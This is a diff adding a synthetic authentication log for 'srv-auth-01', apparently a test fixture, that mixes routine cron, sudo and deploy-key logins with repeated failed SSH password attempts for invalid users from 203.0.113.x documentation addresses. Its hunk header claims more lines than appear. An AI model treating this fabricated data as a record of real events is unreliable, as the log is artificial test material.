@@ -1,0 +1,1034 @@
+2026-11-05 01:00:00 srv-auth-01 CRON[1409]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:00:01 srv-auth-01 systemd[1]: Started Session 260 of user deploy.
+2026-11-05 01:00:02 srv-auth-01 sshd[3286]: Accepted publickey for deploy from 10.0.1.175 port 54270 ssh2
+2026-11-05 01:00:03 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:00:04 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:00:05 srv-auth-01 CRON[1488]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:00:06 srv-auth-01 CRON[4582]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:00:07 srv-auth-01 sshd[9279]: Accepted publickey for deploy from 10.0.9.8 port 48390 ssh2
+2026-11-05 01:00:08 srv-auth-01 sshd[9928]: Accepted publickey for deploy from 10.0.6.58 port 44719 ssh2
+2026-11-05 01:00:09 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:00:10 srv-auth-01 CRON[3615]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:00:11 srv-auth-01 sshd[6574]: Failed password for invalid user oracle from 203.0.113.41 port 37055 ssh2
+2026-11-05 01:00:12 srv-auth-01 systemd[1]: Started Session 114 of user deploy.
+2026-11-05 01:00:13 srv-auth-01 CRON[7224]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:00:14 srv-auth-01 CRON[6881]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:00:15 srv-auth-01 systemd[1]: Started Session 628 of user deploy.
+2026-11-05 01:00:16 srv-auth-01 systemd[1]: Started Session 836 of user deploy.
+2026-11-05 01:00:17 srv-auth-01 CRON[8527]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:00:18 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:00:19 srv-auth-01 sshd[2291]: Failed password for invalid user oracle from 203.0.113.214 port 50599 ssh2
+2026-11-05 01:00:20 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:00:21 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:00:22 srv-auth-01 CRON[1750]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:00:23 srv-auth-01 sshd[5741]: Accepted publickey for deploy from 10.0.1.220 port 37628 ssh2
+2026-11-05 01:00:24 srv-auth-01 CRON[7227]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:00:25 srv-auth-01 systemd[1]: Started Session 474 of user deploy.
+2026-11-05 01:00:26 srv-auth-01 systemd[1]: Started Session 176 of user deploy.
+2026-11-05 01:00:27 srv-auth-01 systemd[1]: Started Session 373 of user deploy.
+2026-11-05 01:00:28 srv-auth-01 sshd[5374]: Accepted publickey for deploy from 10.0.1.157 port 50806 ssh2
+2026-11-05 01:00:29 srv-auth-01 sshd[9751]: Accepted publickey for deploy from 10.0.3.43 port 45147 ssh2
+2026-11-05 01:00:30 srv-auth-01 sshd[5422]: Failed password for invalid user test from 203.0.113.177 port 40626 ssh2
+2026-11-05 01:00:31 srv-auth-01 CRON[4752]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:00:32 srv-auth-01 CRON[6168]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:00:33 srv-auth-01 sshd[5386]: Failed password for invalid user admin from 203.0.113.56 port 59921 ssh2
+2026-11-05 01:00:34 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:00:35 srv-auth-01 systemd[1]: Started Session 227 of user deploy.
+2026-11-05 01:00:36 srv-auth-01 sshd[7482]: Failed password for invalid user pi from 203.0.113.38 port 38679 ssh2
+2026-11-05 01:00:37 srv-auth-01 sshd[5040]: Accepted publickey for deploy from 10.0.8.139 port 38609 ssh2
+2026-11-05 01:00:38 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:00:39 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:00:40 srv-auth-01 systemd[1]: Started Session 234 of user deploy.
+2026-11-05 01:00:41 srv-auth-01 sshd[9348]: Accepted publickey for deploy from 10.0.7.25 port 54765 ssh2
+2026-11-05 01:00:42 srv-auth-01 CRON[2796]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:00:43 srv-auth-01 sshd[3621]: Accepted publickey for deploy from 10.0.6.154 port 32081 ssh2
+2026-11-05 01:00:44 srv-auth-01 sshd[7252]: Failed password for invalid user pi from 203.0.113.137 port 38238 ssh2
+2026-11-05 01:00:45 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:00:46 srv-auth-01 CRON[9797]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:00:47 srv-auth-01 systemd[1]: Started Session 797 of user deploy.
+2026-11-05 01:00:48 srv-auth-01 systemd[1]: Started Session 124 of user deploy.
+2026-11-05 01:00:49 srv-auth-01 systemd[1]: Started Session 455 of user deploy.
+2026-11-05 01:00:50 srv-auth-01 sshd[8433]: Accepted publickey for deploy from 10.0.0.246 port 53661 ssh2
+2026-11-05 01:00:51 srv-auth-01 systemd[1]: Started Session 522 of user deploy.
+2026-11-05 01:00:52 srv-auth-01 sshd[9317]: Accepted publickey for deploy from 10.0.1.224 port 50489 ssh2
+2026-11-05 01:00:53 srv-auth-01 systemd[1]: Started Session 871 of user deploy.
+2026-11-05 01:00:54 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:00:55 srv-auth-01 sshd[3504]: Accepted publickey for deploy from 10.0.5.197 port 35293 ssh2
+2026-11-05 01:00:56 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:00:57 srv-auth-01 CRON[6310]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:00:58 srv-auth-01 sshd[1319]: Failed password for invalid user admin from 203.0.113.239 port 41894 ssh2
+2026-11-05 01:00:59 srv-auth-01 systemd[1]: Started Session 255 of user deploy.
+2026-11-05 01:01:00 srv-auth-01 CRON[4946]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:01:01 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:01:02 srv-auth-01 CRON[8962]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:01:03 srv-auth-01 CRON[9727]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:01:04 srv-auth-01 sshd[3103]: Accepted publickey for deploy from 10.0.7.244 port 48015 ssh2
+2026-11-05 01:01:05 srv-auth-01 sshd[5342]: Accepted publickey for deploy from 10.0.8.225 port 49876 ssh2
+2026-11-05 01:01:06 srv-auth-01 sshd[4470]: Failed password for invalid user test from 203.0.113.184 port 40214 ssh2
+2026-11-05 01:01:07 srv-auth-01 sshd[7118]: Failed password for invalid user pi from 203.0.113.232 port 46959 ssh2
+2026-11-05 01:01:08 srv-auth-01 sshd[2982]: Failed password for invalid user test from 203.0.113.59 port 32098 ssh2
+2026-11-05 01:01:09 srv-auth-01 systemd[1]: Started Session 31 of user deploy.
+2026-11-05 01:01:10 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:01:11 srv-auth-01 sshd[4608]: Accepted publickey for deploy from 10.0.0.20 port 53194 ssh2
+2026-11-05 01:01:12 srv-auth-01 CRON[4750]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:01:13 srv-auth-01 CRON[1514]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:01:14 srv-auth-01 systemd[1]: Started Session 82 of user deploy.
+2026-11-05 01:01:15 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:01:16 srv-auth-01 systemd[1]: Started Session 695 of user deploy.
+2026-11-05 01:01:17 srv-auth-01 sshd[4510]: Failed password for invalid user test from 203.0.113.187 port 58913 ssh2
+2026-11-05 01:01:18 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:01:19 srv-auth-01 sshd[4981]: Failed password for invalid user pi from 203.0.113.208 port 43338 ssh2
+2026-11-05 01:01:20 srv-auth-01 sshd[2545]: Accepted publickey for deploy from 10.0.1.170 port 44124 ssh2
+2026-11-05 01:01:21 srv-auth-01 systemd[1]: Started Session 443 of user deploy.
+2026-11-05 01:01:22 srv-auth-01 sshd[8651]: Failed password for invalid user admin from 203.0.113.174 port 51412 ssh2
+2026-11-05 01:01:23 srv-auth-01 CRON[1993]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:01:24 srv-auth-01 sshd[6559]: Failed password for invalid user admin from 203.0.113.65 port 36278 ssh2
+2026-11-05 01:01:25 srv-auth-01 sshd[9786]: Accepted publickey for deploy from 10.0.7.37 port 43824 ssh2
+2026-11-05 01:01:26 srv-auth-01 sshd[5563]: Accepted publickey for deploy from 10.0.7.65 port 58655 ssh2
+2026-11-05 01:01:27 srv-auth-01 CRON[8260]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:01:28 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:01:29 srv-auth-01 CRON[9856]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:01:30 srv-auth-01 CRON[2528]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:01:31 srv-auth-01 sshd[3724]: Accepted publickey for deploy from 10.0.6.126 port 45773 ssh2
+2026-11-05 01:01:32 srv-auth-01 sshd[7570]: Accepted publickey for deploy from 10.0.0.44 port 42418 ssh2
+2026-11-05 01:01:33 srv-auth-01 CRON[7396]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:01:34 srv-auth-01 systemd[1]: Started Session 958 of user deploy.
+2026-11-05 01:01:35 srv-auth-01 sshd[5673]: Failed password for invalid user pi from 203.0.113.180 port 53937 ssh2
+2026-11-05 01:01:36 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:01:37 srv-auth-01 sshd[3536]: Failed password for invalid user test from 203.0.113.77 port 37133 ssh2
+2026-11-05 01:01:38 srv-auth-01 CRON[9883]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:01:39 srv-auth-01 CRON[6138]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:01:40 srv-auth-01 CRON[1821]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:01:41 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:01:42 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:01:43 srv-auth-01 sshd[1931]: Accepted publickey for deploy from 10.0.8.22 port 57896 ssh2
+2026-11-05 01:01:44 srv-auth-01 sshd[2122]: Accepted publickey for deploy from 10.0.9.19 port 52125 ssh2
+2026-11-05 01:01:45 srv-auth-01 sshd[7615]: Accepted publickey for deploy from 10.0.1.243 port 59172 ssh2
+2026-11-05 01:01:46 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:01:47 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:01:48 srv-auth-01 CRON[2343]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:01:49 srv-auth-01 sshd[9565]: Failed password for invalid user oracle from 203.0.113.241 port 38544 ssh2
+2026-11-05 01:01:50 srv-auth-01 sshd[6147]: Accepted publickey for deploy from 10.0.3.69 port 42969 ssh2
+2026-11-05 01:01:51 srv-auth-01 sshd[5915]: Accepted publickey for deploy from 10.0.7.82 port 54637 ssh2
+2026-11-05 01:01:52 srv-auth-01 CRON[1152]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:01:53 srv-auth-01 sshd[2638]: Failed password for invalid user admin from 203.0.113.139 port 36984 ssh2
+2026-11-05 01:01:54 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:01:55 srv-auth-01 sshd[6718]: Accepted publickey for deploy from 10.0.1.227 port 38004 ssh2
+2026-11-05 01:01:56 srv-auth-01 systemd[1]: Started Session 301 of user deploy.
+2026-11-05 01:01:57 srv-auth-01 sshd[8179]: Accepted publickey for deploy from 10.0.8.182 port 39912 ssh2
+2026-11-05 01:01:58 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:01:59 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:02:00 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:02:01 srv-auth-01 CRON[3200]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:02:02 srv-auth-01 systemd[1]: Started Session 128 of user deploy.
+2026-11-05 01:02:03 srv-auth-01 CRON[3546]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:02:04 srv-auth-01 systemd[1]: Started Session 298 of user deploy.
+2026-11-05 01:02:05 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:02:06 srv-auth-01 systemd[1]: Started Session 218 of user deploy.
+2026-11-05 01:02:07 srv-auth-01 systemd[1]: Started Session 527 of user deploy.
+2026-11-05 01:02:08 srv-auth-01 sshd[5114]: Failed password for invalid user admin from 203.0.113.25 port 50784 ssh2
+2026-11-05 01:02:09 srv-auth-01 sshd[5533]: Failed password for invalid user admin from 203.0.113.2 port 40929 ssh2
+2026-11-05 01:02:10 srv-auth-01 sshd[5291]: Accepted publickey for deploy from 10.0.2.191 port 44478 ssh2
+2026-11-05 01:02:11 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:02:12 srv-auth-01 sshd[1158]: Failed password for invalid user admin from 203.0.113.21 port 58937 ssh2
+2026-11-05 01:02:13 srv-auth-01 sshd[9938]: Accepted publickey for deploy from 10.0.0.215 port 42098 ssh2
+2026-11-05 01:02:14 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:02:15 srv-auth-01 sshd[8041]: Accepted publickey for deploy from 10.0.2.12 port 40101 ssh2
+2026-11-05 01:02:16 srv-auth-01 systemd[1]: Started Session 930 of user deploy.
+2026-11-05 01:02:17 srv-auth-01 CRON[6862]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:02:18 srv-auth-01 sshd[5088]: Accepted publickey for deploy from 10.0.1.92 port 55562 ssh2
+2026-11-05 01:02:19 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:02:20 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:02:21 srv-auth-01 sshd[4878]: Accepted publickey for deploy from 10.0.2.206 port 56567 ssh2
+2026-11-05 01:02:22 srv-auth-01 sshd[7755]: Accepted publickey for deploy from 10.0.0.47 port 54135 ssh2
+2026-11-05 01:02:23 srv-auth-01 systemd[1]: Started Session 811 of user deploy.
+2026-11-05 01:02:24 srv-auth-01 sshd[5065]: Failed password for invalid user oracle from 203.0.113.42 port 55800 ssh2
+2026-11-05 01:02:25 srv-auth-01 CRON[7267]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:02:26 srv-auth-01 CRON[8711]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:02:27 srv-auth-01 sshd[4269]: Accepted publickey for deploy from 10.0.7.91 port 40000 ssh2
+2026-11-05 01:02:28 srv-auth-01 sshd[4652]: Accepted publickey for deploy from 10.0.0.170 port 36328 ssh2
+2026-11-05 01:02:29 srv-auth-01 sshd[6378]: Failed password for invalid user oracle from 203.0.113.223 port 32274 ssh2
+2026-11-05 01:02:30 srv-auth-01 systemd[1]: Started Session 369 of user deploy.
+2026-11-05 01:02:31 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:02:32 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:02:33 srv-auth-01 CRON[2889]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:02:34 srv-auth-01 systemd[1]: Started Session 192 of user deploy.
+2026-11-05 01:02:35 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:02:36 srv-auth-01 CRON[2776]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:02:37 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:02:38 srv-auth-01 systemd[1]: Started Session 756 of user deploy.
+2026-11-05 01:02:39 srv-auth-01 systemd[1]: Started Session 456 of user deploy.
+2026-11-05 01:02:40 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:02:41 srv-auth-01 CRON[7311]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:02:42 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:02:43 srv-auth-01 systemd[1]: Started Session 55 of user deploy.
+2026-11-05 01:02:44 srv-auth-01 sshd[1027]: Failed password for invalid user test from 203.0.113.95 port 44132 ssh2
+2026-11-05 01:02:45 srv-auth-01 CRON[6409]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:02:46 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:02:47 srv-auth-01 CRON[5920]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:02:48 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:02:49 srv-auth-01 sshd[6344]: Failed password for invalid user pi from 203.0.113.180 port 39688 ssh2
+2026-11-05 01:02:50 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:02:51 srv-auth-01 sshd[7888]: Accepted publickey for deploy from 10.0.6.175 port 54514 ssh2
+2026-11-05 01:02:52 srv-auth-01 sshd[5930]: Accepted publickey for deploy from 10.0.6.142 port 57319 ssh2
+2026-11-05 01:02:53 srv-auth-01 CRON[5978]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:02:54 srv-auth-01 systemd[1]: Started Session 225 of user deploy.
+2026-11-05 01:02:55 srv-auth-01 sshd[6279]: Failed password for invalid user pi from 203.0.113.115 port 44488 ssh2
+2026-11-05 01:02:56 srv-auth-01 sshd[9375]: Accepted publickey for deploy from 10.0.7.205 port 59529 ssh2
+2026-11-05 01:02:57 srv-auth-01 sshd[2389]: Accepted publickey for deploy from 10.0.4.133 port 51753 ssh2
+2026-11-05 01:02:58 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:02:59 srv-auth-01 CRON[4848]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:03:00 srv-auth-01 systemd[1]: Started Session 240 of user deploy.
+2026-11-05 01:03:01 srv-auth-01 sshd[3414]: Accepted publickey for deploy from 10.0.0.13 port 38023 ssh2
+2026-11-05 01:03:02 srv-auth-01 sshd[2193]: Failed password for invalid user pi from 203.0.113.108 port 59036 ssh2
+2026-11-05 01:03:03 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:03:04 srv-auth-01 sshd[9099]: Failed password for invalid user pi from 203.0.113.64 port 34835 ssh2
+2026-11-05 01:03:05 srv-auth-01 CRON[2746]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:03:06 srv-auth-01 sshd[4585]: Failed password for invalid user test from 203.0.113.207 port 52803 ssh2
+2026-11-05 01:03:07 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:03:08 srv-auth-01 CRON[5082]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:03:09 srv-auth-01 CRON[8478]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:03:10 srv-auth-01 sshd[8612]: Accepted publickey for deploy from 10.0.8.145 port 49511 ssh2
+2026-11-05 01:03:11 srv-auth-01 systemd[1]: Started Session 982 of user deploy.
+2026-11-05 01:03:12 srv-auth-01 sshd[9270]: Failed password for invalid user pi from 203.0.113.214 port 59715 ssh2
+2026-11-05 01:03:13 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:03:14 srv-auth-01 sshd[8777]: Accepted publickey for deploy from 10.0.7.68 port 54634 ssh2
+2026-11-05 01:03:15 srv-auth-01 sshd[5543]: Accepted publickey for deploy from 10.0.8.126 port 50537 ssh2
+2026-11-05 01:03:16 srv-auth-01 sshd[5499]: Accepted publickey for deploy from 10.0.7.21 port 53381 ssh2
+2026-11-05 01:03:17 srv-auth-01 systemd[1]: Started Session 250 of user deploy.
+2026-11-05 01:03:18 srv-auth-01 systemd[1]: Started Session 353 of user deploy.
+2026-11-05 01:03:19 srv-auth-01 systemd[1]: Started Session 924 of user deploy.
+2026-11-05 01:03:20 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:03:21 srv-auth-01 sshd[3471]: Accepted publickey for deploy from 10.0.3.100 port 52739 ssh2
+2026-11-05 01:03:22 srv-auth-01 sshd[4505]: Accepted publickey for deploy from 10.0.1.108 port 43356 ssh2
+2026-11-05 01:03:23 srv-auth-01 systemd[1]: Started Session 565 of user deploy.
+2026-11-05 01:03:24 srv-auth-01 sshd[7812]: Failed password for invalid user admin from 203.0.113.54 port 57292 ssh2
+2026-11-05 01:03:25 srv-auth-01 sshd[7381]: Failed password for invalid user admin from 203.0.113.221 port 58857 ssh2
+2026-11-05 01:03:26 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:03:27 srv-auth-01 sshd[1096]: Failed password for invalid user oracle from 203.0.113.78 port 54689 ssh2
+2026-11-05 01:03:28 srv-auth-01 sshd[7865]: Failed password for invalid user test from 203.0.113.126 port 37190 ssh2
+2026-11-05 01:03:29 srv-auth-01 systemd[1]: Started Session 456 of user deploy.
+2026-11-05 01:03:30 srv-auth-01 sshd[1475]: Failed password for invalid user pi from 203.0.113.88 port 51917 ssh2
+2026-11-05 01:03:31 srv-auth-01 sshd[3704]: Failed password for invalid user pi from 203.0.113.237 port 34182 ssh2
+2026-11-05 01:03:32 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:03:33 srv-auth-01 CRON[7455]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:03:34 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:03:35 srv-auth-01 CRON[2375]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:03:36 srv-auth-01 sshd[3223]: Failed password for invalid user pi from 203.0.113.48 port 31647 ssh2
+2026-11-05 01:03:37 srv-auth-01 systemd[1]: Started Session 398 of user deploy.
+2026-11-05 01:03:38 srv-auth-01 systemd[1]: Started Session 226 of user deploy.
+2026-11-05 01:03:39 srv-auth-01 sshd[6355]: Failed password for invalid user oracle from 203.0.113.196 port 58824 ssh2
+2026-11-05 01:03:40 srv-auth-01 sshd[5558]: Failed password for invalid user pi from 203.0.113.66 port 57358 ssh2
+2026-11-05 01:03:41 srv-auth-01 CRON[8705]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:03:42 srv-auth-01 CRON[9837]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:03:43 srv-auth-01 CRON[6733]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:03:44 srv-auth-01 sshd[2124]: Accepted publickey for deploy from 10.0.0.195 port 31016 ssh2
+2026-11-05 01:03:45 srv-auth-01 sshd[4266]: Accepted publickey for deploy from 10.0.0.161 port 34993 ssh2
+2026-11-05 01:03:46 srv-auth-01 sshd[3068]: Accepted publickey for deploy from 10.0.7.173 port 33748 ssh2
+2026-11-05 01:03:47 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:03:48 srv-auth-01 sshd[5198]: Failed password for invalid user oracle from 203.0.113.44 port 49853 ssh2
+2026-11-05 01:03:49 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:03:50 srv-auth-01 CRON[3683]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:03:51 srv-auth-01 systemd[1]: Started Session 120 of user deploy.
+2026-11-05 01:03:52 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:03:53 srv-auth-01 systemd[1]: Started Session 599 of user deploy.
+2026-11-05 01:03:54 srv-auth-01 sshd[7498]: Failed password for invalid user test from 203.0.113.21 port 49401 ssh2
+2026-11-05 01:03:55 srv-auth-01 sshd[2669]: Accepted publickey for deploy from 10.0.4.219 port 52421 ssh2
+2026-11-05 01:03:56 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:03:57 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:03:58 srv-auth-01 systemd[1]: Started Session 555 of user deploy.
+2026-11-05 01:03:59 srv-auth-01 sshd[7071]: Failed password for invalid user admin from 203.0.113.131 port 51218 ssh2
+2026-11-05 01:04:00 srv-auth-01 systemd[1]: Started Session 22 of user deploy.
+2026-11-05 01:04:01 srv-auth-01 sshd[9031]: Failed password for invalid user admin from 203.0.113.112 port 41868 ssh2
+2026-11-05 01:04:02 srv-auth-01 sshd[3506]: Failed password for invalid user pi from 203.0.113.47 port 54045 ssh2
+2026-11-05 01:04:03 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:04:04 srv-auth-01 systemd[1]: Started Session 640 of user deploy.
